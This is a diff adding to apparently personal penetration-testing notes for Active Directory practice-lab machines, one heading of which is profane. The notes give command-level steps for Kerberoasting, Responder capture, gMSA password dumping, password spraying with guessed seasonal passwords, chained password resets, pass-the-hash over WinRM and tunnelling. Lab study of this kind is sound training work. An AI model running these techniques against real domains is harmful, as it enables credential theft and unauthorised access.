@@ -14,9 +14,15 @@
 1. Use Get-SPNs.ps1 then `Add-Type -AssemblyName System.IdentityModel` then `New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'MSSQLSvc/DC.access.offsec'` to store token in memory 
 2. Run Invoke-Kerberoast.ps1 to grab the hash then `Invoke-RunasCs -Username {{USERNAME}} -Password {{PASSWORD}} -Command "whoami"` (Invoke-RunasCs needs importing) 
 
-#### Heist 
+#### Heist => Group can dump password 
 1. Responder only works with HTTP On and 'http://{{LHOST}}' 
 2. Run ` Get-ADServiceAccount -Filter * -Properties PrincipalsAllowedToRetrieveManagedPassword | Select-Object Name, PrincipalsAllowedToRetrieveManagedPassword ` to check, then `Import-Module .\GMSAPassword.ps1` to dump 
+
+#### Nagoya => Fucking piece of shit 
+1. Make users list from website, guess some passwords (eg Summer2023, Nagoya2023) and spray 
+2. In rpcclient, 'fiona' changes pw for 'svc_helpdesk', 'svc_helpdesk' changes pw for 'christopher'. 
+3. Run `Import-Module ActiveDirectory` then `Get-ADDomain` then `Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName` to get sid 
+4. Kerberoast to get svc_mssql, run chisel = https://medium.com/@mu.aktepe18/nagoya-proving-ground-walk-through-afb50d51bb0f 
 
 #### Resourced => RBCD 
 1. Check enum4linux properly! `crackmapexec winrm {{DC_IP}} -u names.txt -H hashes.txt` 
